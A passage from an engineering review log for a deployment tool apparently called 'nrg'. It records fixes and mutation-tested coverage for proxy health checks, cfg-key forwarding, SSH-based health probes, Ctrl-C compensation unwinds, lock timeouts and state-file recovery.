(`tests/caddy_proxy.rs`), which runs a real `deploy()` call with
`cfg.proxy: "caddy"` and asserts the resulting dry-run plan's Caddy route JSON
actually contains the `health_checks.active` block with the default `/up`
path and `10s` interval — proving the wiring reaches a real deploy, not just
that the mechanism exists in isolation. Mutation-verified: forcing
`proxy_deploy`'s `health_path` to always be empty (simulating the asymmetry
regressing) made the new test fail for the right reason. No production code
change was needed — this was purely a documentation/test-coverage gap, not a
functional bug.

**Precision note (found during this fix's own Opus review):** the ACTUAL
switch-time gate — the thing that decides whether the new container is
ready BEFORE traffic ever moves to it — is `wait_healthy_on_host`
(`lib/deploy.rhai`), which runs identically before either backend's
`proxy_deploy`; that half was already symmetric before this investigation.
What Caddy's `health_checks.active` block adds is a DIFFERENT, complementary
guarantee: ongoing, POST-switch polling that can pull an upstream back out
of rotation if it dies after having passed the pre-switch gate (e.g. the
"answers `/up` once during boot then OOMs" scenario the original finding
described) — not a repeat of the pre-cutover check itself. kamal-proxy's own
`--health-check-path` (`lib/proxy.rhai:109`) provides a comparable ongoing
check on its side. The practical gap the original finding raised (a
container that passes health once, then dies post-switch, keeps receiving
traffic on Caddy but not on kamal-proxy) is what's actually closed here —
described more precisely as closing an ongoing-monitoring asymmetry, not a
switch-time-gate asymmetry.

**Found during R12's own Fable final review, not part of R12 — resolved separately
(2026-07-11, round 3) — kamal-proxy silently ignored `cfg.domain`.** While
verifying the health-check symmetry above, Fable noticed a DIFFERENT,
unrelated Caddy-vs-kamal-proxy asymmetry: `cfg.domain` is threaded into
Caddy's route for automatic HTTPS (`lib/caddy.rhai:138-140`), but
kamal-proxy's own `proxy_deploy` (`lib/proxy.rhai`) never reads `cfg.domain`
at all, and `deploy()` never calls `kproxy::proxy_set_tls` either — so a
caller who sets `cfg.domain` on the kamal-proxy backend (the default) used
to silently get no TLS/domain routing at all, with no error or warning.
Implementing genuine domain-based routing/TLS for kamal-proxy itself was
judged out of scope (it would mean guessing at kamal-proxy's exact CLI
surface for this without being able to verify against the real binary in
this environment — the wrong flags would be worse than the original
silence). Instead, fixed the same way this whole review series treats every
other "cfg key silently accepted but not honored" bug (R20/R23c): `deploy()`'s
proxy dispatch (`px_deploy`, `lib/deploy.rhai`) now throws a clear error —
"cfg.domain (...) is set, but the kamal-proxy backend ... does not support
domain-based routing or automatic TLS in this codebase — use cfg.proxy:
\"caddy\" instead, or omit cfg.domain..." — instead of silently deploying
with the domain dropped. Covered by a new test,
`deploy_refuses_a_domain_on_the_default_kamal_proxy_backend`
(`tests/deploy_behaviors.rs`), confirming the error fires for a plain
`deploy()` call with `domain` set and no explicit `cfg.proxy`; the existing
`proxy: "caddy", domain: ...` test (`tests/deploy_behaviors.rs`,
`standard_deploy` cfg-forwarding coverage) continues to pass unaffected,
since the new check only fires on the non-Caddy branch. Mutation-verified:
disabling the check made the new test fail for the right reason (the
deploy succeeded instead of throwing).

**Follow-up (found during this fix's own Opus review) — relocated to match this
codebase's fail-fast convention.** The check originally lived only inside
`px_deploy`, which for an ordinary `deploy()` call isn't reached until the
FIRST host's forward proxy switch — by then `deploy()` had already run the
build, push, pull-on-all-hosts, `pre_deploy` (migrations against the new
image), and the first host's container start plus full health-check wait,
all for a purely static config error (`domain` + kamal-proxy) knowable with
zero I/O. Opus also traced that this placement made the SAME throw fire a
second time, harmlessly, during that first host's rollback-compensation
unwind (the restore-proxy compensation calls `px_deploy` again with the
same cfg) — swallowed by the engine's best-effort unwind, not a worse
failure, but redundant. Every other precondition of this exact class (R29
nesting, R21 empty-hosts, the arch-mismatch preflight) is checked at the
TOP of `deploy()`, before any work at all — this one now is too, added
right alongside `domain`'s own default-assignment line. `px_deploy`'s
original check is kept as defense-in-depth for any future direct caller of
that function, but the top-of-`deploy()` copy is what actually fires for a
normal call now. No test changes needed — the existing test's assertion
(a substring of the error message, unchanged) still passes, now against
the earlier-firing throw.

**Follow-up (found during this fix's own Fable final review) — three real
gaps, all fixed.** (1) *The fail-fast property itself was untested.* Fable
disabled ONLY the new top-of-`deploy()` check (leaving `px_deploy`'s
defense-in-depth copy intact) and the existing test still passed — both
copies throw the identical message, so the test couldn't tell which one
actually fired, meaning a future regression that re-buried the check back
inside `px_deploy` would go undetected. Fixed by adding a second assertion
to the same test: stderr must NOT contain `"==> Deploying"`, `deploy()`'s
own first `print()` (routed to stderr), which only runs AFTER the fail-fast
check — its absence proves the throw happened before any build/push/pull
work started, not just eventually. (2) *`rollback()` had no mirror of the
guard*, the one `deploy()` precondition in this class without one — every
other rollback()-mutates-`.prev`-before-`deploy()`-validates hazard (R29,
R21, `keep_images`) already has its own up-front copy in `rollback()`
itself, added specifically because `rollback()` persists `.prev = <current
image>` as a real side effect BEFORE calling `deploy()`. A caller who
replays a persisted `domain`+caddy config through `rollback()` with an
override that switches it to kamal-proxy would advance `.prev` to the
current (possibly broken) image before `deploy()`'s validation throws —
confirmed by mutation-testing this exact scenario (disabling only the new
`rollback()` guard let `.prev` advance to the current image even though
`deploy()`'s own check still caught the bad config and failed the call).
Fixed with the same pattern as the other three guards: checked as
`rollback()`'s own first statement (on the fully-merged `replay` config,
persisted config with caller overrides applied), before the `.prev`
mutation. Covered by a new test,
`rollback_refuses_a_replayed_domain_on_kamal_proxy_without_first_mutating_prev_state`.
(3) *A stale code comment* in `px_deploy`'s own doc comment cited
`deploy_one_host` as an example of a "future caller ... outside this
fail-fast path" — impossible, since `deploy_one_host` is `private fn` and
only ever reached through `deploy()` itself (which now has the fail-fast
check). Corrected to cite the real justification: `px_deploy` is itself
`pub fn`, so a script that imports the module and calls
`deploy::px_deploy(...)` directly bypasses `deploy()`'s check entirely —
that direct-caller path is what `px_deploy`'s own copy actually guards
against.

**R23c — Resolved separately (2026-07-10).** `standard_deploy`'s broader silent
cfg-key drops (found during the R12 addendum's own Opus review) are now closed.
Beyond the four `health_*` keys fixed above, `lib/recipe.rhai`'s
`standard_deploy` was still silently dropping every one of `volumes`,
`build_context`, `dockerfile`, `build_args`, `platform`, `skip_build`,
`skip_push`, `pre_deploy_cmd`, `post_deploy_cmd` — the SAME class of bug as the
addendum above (an accepted-looking key silently ignored, no error). All nine
now forward via a single loop over the key list — the same `for k in [...]`
idiom this file already uses for its own required-key checks above
and that `rollback()`'s state replay uses elsewhere in `lib/deploy.rhai`
— rather than nine more individual `if cfg.contains(x) { dcfg.x = cfg.x }`
lines like the four `health_*` keys above use. Covered by 2 new tests in
`tests/deploy_behaviors.rs`:
`standard_deploy_forwards_volumes_and_deploy_hook_cmds_to_deploy` (checks
`volumes`/`pre_deploy_cmd`/`post_deploy_cmd` via the persisted
`<service>.config` state line — the same observable contract used for the
`health_*` keys) and `standard_deploy_forwards_build_and_skip_flags_to_deploy`
(checks `build_context`/`dockerfile`/`build_args`/`platform` via the dry-run
plan's own `docker build`/`buildx build` line, and `skip_build`/`skip_push` via
the ABSENCE of any build/push plan line at all — these six aren't part of the
replayed `effective_cfg`, since build/push are forced off on rollback replay
regardless, so they have no other observable dry-run contract). Both
mutation-verified: reverting the forwarding loop entirely failed both tests;
a SURGICAL mutation keeping only the six build/skip keys in the loop (dropping
`volumes`/`pre_deploy_cmd`/`post_deploy_cmd`) failed only the first test while
the second stayed green, proving the two tests are independently precise about
which keys they each cover.

**The structural fix for the recurring pattern — implemented (2026-07-10, round
2).** This was the THIRD time in this review series that fixing one instance of
a `standard_deploy` cfg-forwarding gap (R23's `network`-to-accessories miss, the
R12 addendum's `health_attempts`/`health_interval` miss, the R23c sweep above)
surfaced during its own review as bigger than what was just fixed —
`standard_deploy` hand-copied `deploy()`'s cfg-key inventory into its own
`dcfg`-building code, and the two lists drifted apart every time `deploy()`
grew a new key. Deferred at the time R23c shipped (deliberately, as a
change-of-strategy rather than an instance-level fix); implemented now as its
own dedicated pass, per Fable's original suggestion: `lib/recipe.rhai`'s
forwarding step now inverts the model — a `const STANDARD_DEPLOY_OWN_KEYS`
denylist of `standard_deploy`'s own ~11 keys (`service`, `image_repo`,
`registry`, `registry_user`, `registry_password`, `web_hosts`, `db_host`,
`port`, `version`, `runtime`, `accessories` — consumed directly by
`standard_deploy` itself, never meaningful to the wrapped `deploy()` call), and
a `for k in cfg.keys()` loop forwards everything else. A future `deploy()` cfg
key now flows through `standard_deploy` automatically, with zero code change
here — closing the exact recurring bug class for good, not just its third
instance. `port` is the one key needing special handling: it's on the denylist
(so it doesn't ALSO forward under its own name, which deploy() wouldn't
recognize anyway) and separately renamed to deploy()'s `container_port`.
Simplification found while implementing: the old code re-applied
`container_port`/`envs`/`health_path` defaults that `deploy()` already supplies
itself for anything absent from `dcfg` — entirely redundant, so the new
`dcfg` starts empty and lets `deploy()`'s own defaults do the work.

Covered by 1 new test, `standard_deploy_forwards_port_rename_and_remaining_deploy_keys`
(`tests/deploy_behaviors.rs`), checking the handful of real `deploy()` cfg keys
that had no dedicated forwarding test before this refactor — `port` (renamed),
`envs`, `health_path`, `proxy`, `domain` — via the persisted `<service>.config`
state line; every other pre-existing `standard_deploy_forwards_*` test
(covering `network`, the four `health_*` keys, `volumes`/`pre_deploy_cmd`/
`post_deploy_cmd`, the six build/skip keys, and `keep_images`) passed unchanged
against the new implementation, empirically proving behavioral equivalence for
every previously-tested case. Mutation-verified: removing the `port` ->
`container_port` rename line broke the new test; replacing the denylist loop's
forwarding condition with `false` (forward nothing) broke every one of the five
pre-existing forwarding tests plus the new one (all six total), proving the
loop itself is load-bearing. (One planned assertion — that `port` mustn't ALSO leak into the
persisted config under its own name — turned out to be unobservable and was
dropped: `deploy()` only ever reads cfg keys it explicitly checks for, so an
extra unrecognized key sitting in `cfg` is silently harmless and never reaches
`effective_cfg`, confirmed by directly testing the mutation before deciding to
drop the assertion rather than ship an untested claim.)

Covered by 4 new tests: `wait_healthy_requires_consecutive_passes_before_returning_healthy`
and `wait_healthy_with_default_consecutive_still_passes_on_the_first_200` (both in
`src/engine/eval.rs`, using a real local HTTP server whose Nth request answers
differently — a `FakeRunner` only intercepts ssh/local exec, not HTTP — and
asserting the EXACT request count, not just "eventually passes", since the old
single-check behavior would also eventually pass, just sooner);
`sim_http_healthy_honors_a_caller_supplied_timeout_instead_of_the_fixed_30s` (in
`src/engine/builtins/http.rs`, using a real listener that accepts a connection and
never responds, asserting the call gives up in ~1s with `timeout_secs: 1` instead
of the old fixed 30s); and `standard_deploy_forwards_health_check_knobs_to_deploy`
(in `tests/deploy_behaviors.rs`, asserting all four `health_*` keys appear in the
dry-run plan's persisted `<service>.config` state line). All mutation-verified:
reverting the streak-tracking logic made the consecutive test fail on the request
COUNT (it still "passed" — proving a naive "eventually passes" assertion would
have been vacuous); reverting the timeout parameter (routing every call through
the old fixed 30s regardless of the argument) made the timeout test fail by
actually taking 30s instead of ~1s; reverting the `standard_deploy` forwarding
lines reproduced the addendum bug exactly.

### R7-health — Medium — health URL assumes the SSH host is an HTTP-reachable name — ✅ resolved
`deploy.rhai:369` + `healthcheck.rhai`. The probe is an HTTP GET from the **control
machine** to `http://<ssh-host-string>:<ephemeral-port><path>`. With the documented
`web_hosts: ["deploy@web1"]`, the URL becomes `http://deploy@web1:13001/up`
(userinfo in the URL, alias not DNS-resolvable), and on hosts firewalled to 80/443
the ephemeral port is unreachable from the control machine — so a perfectly healthy
container fails health-wait and unwinds the fleet. Health checks should run
**on the host** (over SSH against localhost), not from the control machine.

**Resolved (2026-07-10, round 2).** Added `wait_healthy_on_host(host, port, cfg)`
to `lib/healthcheck.rhai`: instead of GETting `http://<host>:<port><path>` from
the control machine, it runs `curl -s -o /dev/null -w '%{http_code}' --max-time
<timeout> http://localhost:<port><path>` **on `host` itself**, over the same SSH
connection every other remote operation in this stdlib already uses (`-w
'%{http_code}'` is the same status-capturing idiom `lib/caddy.rhai`'s admin-API
calls already use). Only SSH connectivity (already required for everything else
`nrg` does) is needed — no assumption that the host string is DNS-resolvable or
that the app's ephemeral port is reachable from the control network. `deploy()`'s
own per-host health gate in `deploy_one_host` now calls this instead of the old
control-machine `wait_healthy`; `wait_healthy_all` (the multi-host convenience
wrapper) was updated the same way, since it had the identical bug. `wait_healthy`
itself is UNCHANGED and kept — it's still correct for callers checking something
the control machine can genuinely reach directly (a public prod URL, a load
balancer), just no longer used for the SSH-only deploy-target case.

An SSH-level transport failure (the command can't even run) is treated as status
`0`, the same "no real HTTP response" convention `do_get`'s own transport-failure
path already uses, so `0` never collides with a genuine status code. Same
`consecutive`-pass-window and configurable-timeout semantics as `wait_healthy`
(R12), and the same `attempts`/`consecutive`/`timeout < 1` validation guards.

Two subtle Rhai semantics bugs surfaced while implementing the status parse and
were fixed before this shipped: (1) `try { parse_int(...) } catch (err) { 0 }`
used as a function's final expression silently evaluates to unit, not the
branch's value — Rhai's `try`/`catch` is a statement, not a value-producing
expression like `if`/`else`; fixed by assigning into an outer-scope variable from
each branch and returning that. (2) `.trim()` mutates a Rhai string in place and
returns unit, not a pure function returning a trimmed copy — `parse_int(s.trim())`
silently became `parse_int(())`; fixed by trimming as its own statement before the
parse.

Covered by 3 new unit tests in `src/engine/eval.rs`
(`wait_healthy_on_host_probes_via_ssh_curl_against_localhost_not_the_control_machine`,
`wait_healthy_on_host_throws_after_exhausting_attempts_with_the_last_status`,
`wait_healthy_on_host_requires_consecutive_passes_before_returning_healthy` — the
last via a bespoke `SequencedCurlRunner` since a plain `FakeRunner` can't express
"the same command answers differently across calls"), plus 2 more targeting the
SSH-failure path specifically (`wait_healthy_on_host_treats_an_ssh_level_failure_as_status_zero`,
and `wait_healthy_on_host_treats_a_nonzero_exit_as_failure_even_with_numeric_stdout`
via a bespoke runner that returns a nonzero exit code but numeric-looking stdout,
proving the `!r.ok` check is load-bearing independent of the parse step), and 4
new integration tests in `tests/deploy_behaviors.rs` covering the three
`attempts`/`consecutive`/`timeout` validation guards and
`wait_healthy_all_checks_each_host_via_ssh_not_a_control_machine_url`. All
mutation-verified: reverting either Rhai semantics fix reproduced a real,
observable failure (status always came back wrong or the probe always threw);
disabling each cfg-validation guard, the `!r.ok` check, and the consecutive-pass
streak logic each made exactly its corresponding test fail; mutating the curl
target from `localhost` to the raw host string was caught by the
control-machine-vs-host assertion test.

---

## 7. State, locking, crash safety (`src/engine/state.rs`, `src/cli/exec.rs`)

The state layer is the most robust part of the codebase (atomic fsync'd writes,
unique temp files, corrupt-state fail-loud, future-version refusal, reload-before-write
merge, `0600`). Residual gaps:

### R7 — High — no signal handling; Ctrl-C runs no compensations — ✅ resolved
`src/main.rs` (absent). There is no SIGINT/SIGTERM handler anywhere. Ctrl-C on a
hanging deploy kills the process mid-transaction: **zero** `on_rollback`
compensations run, the flock is released only by process death, and any state
flushed mid-fleet stays as-is. The operator is left with traffic switched on some
hosts, orphaned `app-web-<ver>` containers, and no automatic unwind. The
transaction docs don't list this as a limit.
**Fix:** install a handler that triggers the compensation unwind (or at minimum
records pending compensations to disk so a follow-up run can complete them), and
document the interrupted-run recovery path.

**Resolved (2026-07-10).** `nrg` now installs a SIGINT/SIGTERM handler once per
`nrg exec`/`nrg run` invocation (`src/engine/interrupt.rs`) that flips a
shared flag, polled by the engine's `on_progress` hook between every
script-level operation (`src/engine/mod.rs`). A set flag ends the running
script with a normal `Err` (`ErrorTerminated`) — the same path a `throw`
takes — so an enclosing `transaction()`'s existing unwind runs every
registered compensation, and the state lock releases via its normal `Drop`,
not because the OS killed the process. The flag is consumed via an atomic
`swap` (not `load`) so the compensations that run during the unwind aren't
themselves immediately re-terminated by the same still-set flag — an actual
bug caught by this fix's own test coverage during development (a naive
`load`-based check silently turned every rollback into a no-op). Documented
in full, including the exact scope, in `docs/safety.md`'s "Ctrl-C
(SIGINT/SIGTERM) triggers the same unwind" section: `on_progress` fires
*between* operations, not *during* one blocking native call, so a
health-check retry loop (bounded `sleep()` per iteration) responds within
about a second, but a single long- or forever-blocking
`ssh_exec`/`local_exec`/`http_get` call can't be preempted mid-flight —
that's the still-open, separate command-timeout gap below. A **second**
signal (which would otherwise be silently swallowed while stuck in exactly
that kind of un-preemptible blocking call, since installing a handler
replaces the default terminate-immediately behavior) exits the process
immediately via `signal_hook::flag::register_conditional_shutdown` — a
force-quit escape hatch, so an operator is never left with no way to kill a
stuck `nrg` short of `SIGKILL`. Covered by a real end-to-end test that sends
an actual SIGINT to a spawned `nrg exec` child process
(`tests/interrupt.rs`) plus a fast unit test simulating the interrupt
without a real signal (`src/engine/mod.rs`).

### Blocking lock wait has no timeout — Medium — ✅ resolved
`wire_run` calls `lock.write()` which blocks indefinitely. There is no
`--lock-timeout`. Worse, if `root.canonicalize()` in `lock_key` fails, the
re-entrancy key won't match `NRG_STATE_LOCK` and a nested `nrg` self-deadlocks
forever. Add a timeout and fall back gracefully on canonicalize failure.

**Resolved (2026-07-11, round 3).** The canonicalize-failure half was already
handled: `lock_key` (`src/engine/state.rs`) has always fallen back to the
non-canonicalized path on `canonicalize()` failure
(`.unwrap_or_else(|_| root.to_path_buf())`), and since that fallback is a
pure, deterministic function of `root` alone, repeated calls against the same
`root` from the same or a nested `nrg` invocation produce the identical key
either way — no self-deadlock risk from that half specifically. The real gap
was the missing timeout, now added: `nrg exec`/`nrg run` accept a new
`--lock-timeout <seconds>` flag (`ExecArgs`/`RunArgs`, `src/cli/exec.rs` /
`src/cli/run.rs`); `wire_run` threads it through as `Option<Duration>`,
`None` (the default) preserving the exact original indefinite-block
behavior byte-for-byte. When a timeout is given, a new
`wait_until_lock_available` helper polls `try_write()` every 100ms
(`LOCK_POLL_INTERVAL`), printing the same one-time "Waiting for the state
lock..." message as before (now including the configured timeout), and
returns a clear `timed out after Ns waiting for the state lock under
<root> — another nrg run appears to be holding it; pass a longer
--lock-timeout, or investigate/stop the other run` error instead of
blocking past it. The actual lock acquisition happens as one final,
un-looped `try_write()` call right after the wait succeeds — deliberately
NOT folded into the polling loop itself: a loop (or recursive helper) that
sometimes returns the acquired `Guard` (borrowed from the lock) and
otherwise keeps reusing the same `&mut` to retry hits a real, reproducible
NLL borrow-checker limitation (rust-lang/rust#54663) that this fix ran
into and worked around during development — the single `try_write()` call
site that can produce the returned guard gets its reborrow forced to last
as long as the function's whole input lifetime regardless of which branch
actually executes, conflicting with every subsequent retry attempt.
Splitting "wait until observed available" (a pure `bool`-returning poll,
never binding the guard) from "the one real, final acquire" (never
looped) sidesteps this entirely. Covered by three new integration tests
in `tests/lock_timeout.rs`: one spawns a real, long-running (`sleep(3)`)
`nrg exec` in the background to hold the lock, then asserts a second,
concurrent `nrg exec --lock-timeout 1` fails with the "timed out after
1s" message; one confirms `--lock-timeout` doesn't interfere with an
ordinary uncontended run; one confirms `nrg run` also accepts the flag.
Mutation-verified: disabling the timeout check (`if false && elapsed >=
timeout`) made the first test fail for the right reason (the contended
run no longer failed — it succeeded after waiting out the holder's 3s
sleep, instead of timing out at 1s as asserted).

**Follow-up (found during this fix's own Opus review) — documentation
gap, fixed; everything else checked out clean.** Opus verified the
duration arithmetic can't underflow (`elapsed` is captured once and
reused for both the timeout check and the sleep-duration subtraction,
so `timeout - elapsed` is always non-negative at that point), confirmed
the split wait-then-acquire can't silently wait longer than the
requested timeout (the final acquire is itself non-blocking) and can't
starve other contenders (nothing is held between poll iterations), and
confirmed re-entrant invocations correctly bypass the timeout path
entirely. The one gap: `--lock-timeout 0` (parses fine as `Some(0)`,
meaning "fail immediately unless already free") wasn't documented
anywhere. Fixed with one clarifying sentence in `docs/cli.md`. The
"final acquire fails right after the wait succeeded" race Opus also
examined is real but pre-existing to THIS fix's own design (the whole
point of the two-step split), astronomically unlikely in practice (a
same-thread poll-then-acquire gap under a microsecond, against a 100ms
poll interval), and — since `--lock-timeout` is new, opt-in behavior —
not a regression against any prior behavior either way.

**Follow-up (found during this fix's own Fable final review) — a genuine
test-coverage gap, fixed.** Fable independently re-verified Opus's core
correctness claims against the committed code (no underflow, non-blocking
final acquire, re-entrancy bypass) and ran the real binary end-to-end
(measured a `--lock-timeout 1` failure at ~1005ms, confirmed `--lock-timeout
0` fails immediately, confirmed a timed-out run correctly appends nothing to
`.energize/audit.log`, confirmed `--dry-run` combined with `--lock-timeout`
harmlessly ignores the flag since dry-run takes no lock at all). It also
independently reproduced the exact E0499 the borrow-checker-workaround
comment describes, confirming that explanation is accurate rather than
folklore a future maintainer might dismiss while "simplifying" this code.
The one real gap: the three original tests would all still pass against a
mutant that ignores `elapsed` entirely and always reports a timeout
regardless of how much time has actually passed (test 1 is contended and
still sees the "timed out" message either way; tests 2 and 3 are
uncontended, so the timeout check is never reached at all) — none of them
proved the wait clause actually waits a *bounded, correct* amount of time
tied to real elapsed time. Fixed by adding a fourth test,
`lock_timeout_actually_waits_out_a_shorter_lived_holder_instead_of_timing_out_instantly`
(`tests/lock_timeout.rs`): a holder releases the lock after ~1s, a
contender with a generous 10s budget must both succeed AND have actually
waited (asserts `elapsed >= 300ms`) rather than trivially returning
immediately. Mutation-verified: changing the guard to
`elapsed >= Duration::ZERO` (an "always timed out, regardless of actual
elapsed time" mutant) made exactly this new test fail for the right reason,
while surviving all three prior tests undetected — confirming the gap was
real and the new test closes it.

### Stale `NRG_STATE_LOCK` defeats serialization — Medium — ✅ resolved
`lock_is_reentrant` trusts the env var. A CI runner that leaks `NRG_STATE_LOCK`
across jobs (same root path) makes a second, genuinely-concurrent deploy skip the
lock and mutate `state.json` concurrently — losing history despite the "serialized"
guarantee. Consider validating the lock is actually held by an ancestor (PID
check), not just that the env var matches.

**Resolved (2026-07-11, round 3).** Took exactly the suggested approach:
`NRG_STATE_LOCK` now stores `"<canonical-root>#<pid>"` (`lock_env_value`,
`src/engine/state.rs`) instead of a bare root path — the PID of the process
that actually acquired the lock. `lock_is_reentrant` now requires BOTH the
root to match AND the recorded PID to still be a live process (`pid_is_alive`).
A value naming the right root but a dead PID is now treated as **not**
reentrant, forcing a fresh lock acquisition instead of silently skipping
serialization. A malformed value (no `#pid` suffix, or a non-numeric one) is
likewise never reentrant. Known, honestly-documented limitation: PIDs are
recycled by the OS, so an especially stale leaked value could in principle
name a NEW, unrelated process that has since reused the same PID — narrower
than the previous unconditional "any env var naming the right root" gap, but
not airtight; a genuinely robust fix would need to verify process ANCESTRY
(this PID is a real ancestor of the current process), which has no portable,
dependency-free implementation across Linux/macOS. Covered by 3 new/updated
unit tests in `src/engine/state.rs`
(`reentrancy_detected_by_matching_env_and_live_pid` — using the test
process's own, guaranteed-alive PID; `reentrancy_rejects_a_stale_pid_even_with_a_matching_root`
— a PID far beyond any real process, e.g. Linux's own hard ceiling
(`PID_MAX_LIMIT`, 4,194,304 on 64-bit — the actual default `pid_max` is far
lower, 32,768); `reentrancy_rejects_malformed_env_values`), mutation-verified:
hard-coding `pid_is_alive` to always return `true` made the stale-pid test
fail for the right reason (falsely treated as reentrant); replacing the
`rsplit_once('#')` + PID-liveness check with a bare `starts_with(key)` prefix
match made BOTH the stale-pid and malformed-value tests fail. The existing
real-subprocess integration tests (`tests/lock_contention.rs`) continue to
pass unmodified — a genuinely nested `nrg` inherits an env var naming its
own, still-running parent process, so the liveness check correctly confirms
reentrancy there.

**Follow-up (found during this fix's own Fable review).** The first version of
`pid_is_alive` used `kill -0 <pid>` unconditionally. But `kill -0` fails with a
nonzero exit for BOTH "no such process" (ESRCH) AND "process exists but is
owned by a DIFFERENT user" (EPERM) — indistinguishable by exit code alone. So
a nested `nrg` spawned under a different UID than its live ancestor (e.g. a
`pre_deploy_cmd` hook running `sudo -u deploy nrg ...`) would wrongly see its
own, still-running parent reported as *dead*, and deadlock on the flock the
parent still holds — a real regression the original `kill`-only version of
this very fix introduced relative to the pre-fix bare-path-match behavior
(which didn't care about liveness at all, and so didn't have this gap).
Fixed by checking `/proc/<pid>` existence on Linux instead: any user can
`stat` another user's `/proc/<pid>` directory to learn a process exists, even
without permission to signal it, so this check is permission-proof. Falls
back to the `kill -0` check (with the same EPERM limitation) if `/proc` isn't
mounted (unusual — some minimal chroots/containers) or on non-Linux Unix,
where there is no portable, dependency-free equivalent; documented as a known
residual gap on those platforms in `docs/safety.md`. Covered by a new test,
`proc_dir_existence_is_permission_proof_unlike_kill_0` (Linux-only,
`src/engine/state.rs`) — it does NOT call `pid_is_alive` directly (this test
process runs as whatever UID invoked `cargo test`, and root's own `kill
-0`/`/proc` access bypasses all permission checks regardless of the target's
owner, so calling `pid_is_alive` from the test process itself could never
exercise the EPERM branch no matter which implementation is behind it; see
the "silently never runs in real CI" finding below — this repo's actual CI
runs `cargo test` as non-root, so the test only exercises this via the
dropped-privilege subprocess described next, and only when run as root
locally); instead it spawns the CHECK itself under a
dropped-privilege subprocess (`setpriv`, skipped gracefully if unavailable)
against this test process's own, definitely-alive PID, and asserts `kill -0`
fails across that UID boundary while `test -d /proc/<pid>` succeeds — directly
proving the OS-level property the fix relies on. An earlier version of this
test dropped privileges on the wrong side (the spawned TARGET, not the
checker) and passed unchanged even with the fix reverted — caught during this
slice's own mutation-testing pass, before either review agent saw it.

### `.bak` recovery path is untested — Medium — ✅ resolved
The `state.json.bak` write is best-effort (`let _ = fs::copy`) and the documented
"restore from backup" recovery has **no test** proving it works. A JSON file that
parses but has the wrong shape (`data` not a map) is also untested.

**Resolved (2026-07-11, round 3), test-only — no code change.** Both gaps
were genuinely just missing tests; the underlying code already behaved
correctly. Added `the_documented_bak_recovery_workflow_actually_restores_a_working_state_file`
(`src/engine/state.rs`): does two writes (the second triggers `flush`'s
"if path.exists() { fs::copy(...) }" backup of the state as of the first
write), corrupts the live `state.json`, confirms `StateStore::load` fails
with a `CORRUPT` error that names `state.json.bak`, then performs the
EXACT documented recovery step (`fs::copy(bak, state.json)` — nothing
`nrg`-specific, just what the error message tells an operator to do) and
confirms the recovered store loads cleanly and holds the pre-corruption
data (correctly one flush stale, by design — the second write's own key is
gone, since that's the write that corrupted the live file and was never
itself backed up). Also added `load_rejects_valid_json_with_the_wrong_shape`:
a file that is syntactically valid JSON but has `data` as a string instead
of a map is rejected the same `CORRUPT` way as unparseable JSON, not a panic
or a silently-garbage store. Mutation-verified for the recovery test:
temporarily disabling the `.bak` write in `flush` (the exact code the test
exercises) made it fail for the right reason ("a .bak must exist after the
second write"), confirming it isn't vacuously passing; restored afterward
and confirmed byte-identical. The wrong-shape test locks in existing
`serde`-derived behavior rather than new logic, so no corresponding
mutation was applicable there.

**Follow-up (found during this fix's own Fable review).** `StateFile` has no
`#[serde(deny_unknown_fields)]`, so an unrecognized top-level field in
`state.json` is silently accepted on load, then silently DROPPED the next
time this project's state is written (`flush` only ever serializes the
known `version`/`data` fields). Reviewed and judged intentional, not a bug:
this schema's forward/backward compatibility is gated by the `version`
field (see `load_rejects_future_version` — a real addition bumps
`STATE_VERSION`, at which point an older `nrg` refuses to load it at all
rather than silently mangling it), not by preserving unknown fields.
Deliberately did NOT add `deny_unknown_fields`, since that would make any
future minor, non-version-bumped schema addition (e.g. during a rolling
upgrade where some hosts still run an older `nrg`) hard-fail instead of
gracefully degrading — a real regression risk for a tradeoff this finding
never asked to change. Documented the current, intentional behavior with a
new test, `load_ignores_unknown_top_level_fields_and_a_later_write_drops_them`,
so a future change to this contract is a deliberate, visible decision.

---

## 8. Tests & CI

### R8 — High — the live deploy path is never executed — ✅ resolved
`tests/deploy_dryrun.rs`, `deploy_behaviors.rs`, `caddy_proxy.rs`. Every integration
test of the ~1,500-line deploy stdlib runs through `--dry-run` and asserts on plan
**strings**. `FakeRunner` is `#[cfg(test)]`-only and can't be injected into the
spawned `nrg` binary, so the live branches (real `r.ok` handling, `wait_healthy`
loops, post-commit cleanup ordering, the whole rollback unwind) are **never run by
any test**. Combined with the plan-string coupling (tests break on benign wording
changes but prove nothing about live behavior), the stdlib's real risk is untested.
**Fix:** add an `NRG_RUNNER=fake` (or a script-injection) seam so integration tests
can drive live-mode branches against a scripted runner; add a local-sshd or
container-based smoke test for at least one real deploy + rollback.

**Resolved incrementally across this round's slices (2026-07-10).** `FakeRunner`
already had the seam this finding asked for — `src/engine/eval.rs`'s test module
constructs a `SharedCtx` directly around a `FakeRunner` and runs the real
`lib/deploy.rhai` through `run_file` in LIVE (non-dry-run) mode, in-process rather
than through the spawned binary. What was missing was actually USING it for the
deploy stdlib's live branches — every slice this round (R15's lock, R22's
`keep_images` pruning, R7-health's SSH probe, and this one) added more live-mode
`FakeRunner` tests exercising real `r.ok` handling, the health-check loop, the
cross-machine lock, and post-commit cleanup ordering, on top of the pre-existing
suite. This slice adds the two pieces that were still missing: a full live
`rollback()` round trip (below), and closing a hollow `wait_healthy_all` test
found during R7-health's Fable review (below). The plan-string integration tests
in `deploy_behaviors.rs` are deliberately kept alongside the live-mode tests, not
replaced by them — they're still the right tool for the parts of `deploy()` that
only decide WHAT to do differently based on cfg (config-forwarding, cfg
validation, guard refusals), where the dry-run plan already IS the observable
contract. A real local-sshd/container-based smoke test remains a follow-up, not
yet tracked as its own roadmap item — genuinely exercising `RealRunner` is a
different, larger undertaking than closing the live-mode-seam gap this finding
was mainly about.

### R8b — High — `rollback()` has zero tests — ✅ resolved
`lib/deploy.rhai:407`. The user-facing disaster-recovery entrypoint is exercised by
**no** test — not even a dry-run plan assertion. Only the compensation *registration*
wiring is checked. During an incident is the worst time to discover it errors.

**Resolved (2026-07-10, round 2).** Added
`rollback_happy_path_redeploys_the_previous_image_and_swaps_prev` (`src/engine/eval.rs`)
— the first test in the codebase to run `rollback()` all the way through: deploy
v1, deploy v2 (which snapshots `.prev = v1` automatically), then call
`rollback(hosts, service)` (the common 2-arg form, no cfg) and assert the full
round trip — the live `.image`/`.version` are back to v1, `.prev` becomes v2 (so a
second rollback would undo this one), and the rollback's own internal `deploy()`
call actually pulled v1 on the host.

**This test immediately found a second, previously-invisible real bug** — exactly
what this finding predicted ("during an incident is the worst time to discover it
